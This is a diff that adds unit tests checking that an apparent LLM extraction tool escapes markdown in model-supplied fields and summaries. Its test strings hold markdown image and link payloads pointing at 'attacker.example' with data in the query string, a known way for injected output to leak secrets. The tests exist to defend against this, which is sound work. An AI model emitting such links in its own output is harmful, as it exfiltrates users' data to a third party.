@@ -12,6 +12,7 @@ import {
   buildPresetMarkdown,
   buildPresetPrompt,
   buildPresetResponseSchema,
+  escapeMarkdown,
   normalizeFieldValue,
   presetRunResultFromText,
   runExtractionPreset,
@@ -334,6 +335,34 @@ describe('buildPresetMarkdown cell hardening', () => {
     expect(md).toContain('\\`code\\`');
     expect(md).toContain('&lt;script&gt;');
     expect(md).not.toContain('<script>');
+  });
+
+  it('escapes link and image syntax so injected values cannot load remote content', () => {
+    const md = markdownForField('![x](https://attacker.example/?d=secret) [click](https://attacker.example)');
+    const fullNameRow = md.split('\n').find((line) => line.includes('full_name'));
+    expect(fullNameRow).toContain('\\!\\[x\\]\\(https://attacker.example/?d=secret\\)');
+    expect(fullNameRow).toContain('\\[click\\]\\(https://attacker.example\\)');
+    expect(fullNameRow).not.toMatch(/(?<!\\)\[[^\]]*(?<!\\)\]\(/);
+  });
+
+  it('neutralizes autolinks and reference-style link definitions', () => {
+    const md = markdownForField('<https://attacker.example/?d=1> [ref]: https://attacker.example');
+    expect(md).toContain('&lt;https://attacker.example/?d=1&gt;');
+    expect(md).toContain('\\[ref\\]: https://attacker.example');
+    expect(md).not.toContain('<https://');
+  });
+
+  it('escapes the model-supplied summary paragraph too', () => {
+    const md = buildPresetMarkdown(
+      { presetId: 'resume', documentType: 'Resume', summary: 'See ![p](https://attacker.example/p.png)\n# Fake heading', fields: {} },
+      preset,
+    );
+    expect(md).toContain('See \\!\\[p\\]\\(https://attacker.example/p.png\\) # Fake heading');
+    expect(md).not.toContain('![p](');
+  });
+
+  it('strips C1 control characters', () => {
+    expect(escapeMarkdown('a\u0085b\u009bc')).toBe('abc');
   });
 });
 
